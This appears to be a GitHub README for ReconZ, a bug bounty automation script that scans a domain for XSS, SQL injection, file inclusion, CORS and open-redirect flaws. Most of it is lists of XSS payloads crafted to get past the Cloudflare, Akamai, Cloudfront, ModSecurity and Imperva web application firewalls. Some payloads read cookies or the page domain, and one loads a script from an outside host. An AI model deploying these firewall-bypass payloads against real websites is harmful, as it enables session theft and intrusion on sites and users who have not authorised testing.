Bug bounty automatization code to search for: 𝐚𝐥𝐢𝐯𝐞 𝐬𝐮𝐛𝐝𝐨𝐦𝐚𝐢𝐧𝐬, 𝐎𝐩𝐞𝐧𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭, 𝐇𝐨𝐬𝐭 𝐇𝐞𝐚𝐝𝐞𝐫 𝐈𝐧𝐞𝐜𝐭𝐢𝐨𝐧, 𝐂𝐨𝐫𝐬 𝐄𝐱𝐩𝐥𝐨𝐢𝐭𝐬, 𝐩𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬 𝐨𝐧 𝐚𝐥𝐥 𝐬𝐮𝐛𝐝𝐨𝐦𝐚𝐢𝐧𝐬, 𝐂𝐫𝐨𝐬𝐬 𝐒𝐢𝐭𝐞 𝐒𝐜𝐫𝐢𝐩𝐭𝐢𝐧𝐠, 𝐑𝐞𝐦𝐨𝐭𝐞 𝐅𝐢𝐥𝐞 𝐈𝐧𝐜𝐥𝐮𝐬𝐢𝐨𝐧, 𝐋𝐨𝐜𝐚𝐥 𝐅𝐢𝐥𝐞 𝐈𝐧𝐜𝐥𝐮𝐬𝐢𝐨𝐧, 𝐒𝐐𝐋 𝐈𝐧𝐣𝐞𝐜𝐭𝐢𝐨𝐧 (𝐌𝐚𝐧𝐲 𝐦𝐨𝐫𝐞 𝐬𝐨𝐨𝐧)

# INSTALLATION

```bash

git clone https://github.com/Anhedoniczz/ReconZ

cd Reconz

chmod +x *.sh
chmod +x Resources/*.sh
./installer.sh

```
# USAGE 

```
usage: ./recon.sh -u domain                     
```


# EXAMPLE
```
./recon.sh -u example.com
```


# FOR ADVANCED XSS 
The tool uses a basic XSS payload to exploit the websites. If you want to do something more advanced, like bypass waf, or use any other payload, you can change line 58.
Some payloads to bypass specific wafs: 


# Paylaods to bypass Cloudflare waf 
```
<svg/onload=window["al"+"ert"]1337>

<Img Src=OnXSS OnError=confirm(1337)>

<Svg Only=1 OnLoad=confirm(document.domain)>

<svg onload=alert&#0000000040document.cookie)>

<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>

%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E

```

# Paylaods to bypass Akamai waf 
```
';k='e'%0Atop['al'+k+'rt'](1)//

'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>

```

# Paylaods to bypass Cloudfront waf 
```
">'><details/open/ontoggle=confirm('XSS')>

6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

';window/*aabb*/['al'%2b'ert'](document./*aabb*/location);//

">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>

```

# Paylaods to bypass MOD SECURITY waf 
```
<svg onload='new Function["Y000!"].find(al\u0065rt)'>
```

# Paylaods to bypass Imperva waf 
```
<Img Src=//X55.is OnLoad%0C=import(Src)>

<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9;//</div">
```

XSS Payloads are from Lostsec Channel <3
You can check the waf type using wappalyzer and replace xss payloads based on that.

Also feel free to change SQLI payloads in ErrorSQLPayloads.txt, just add the list of your choice and it will work perfectly fine.


Creds to authors of used tools:

https://github.com/gotr00t0day

https://github.com/projectdiscovery/

https://github.com/felipemelchior

https://github.com/s0md3v/Corsy

https://github.com/lc/

https://github.com/tomnomnom/

https://github.com/rix4uni
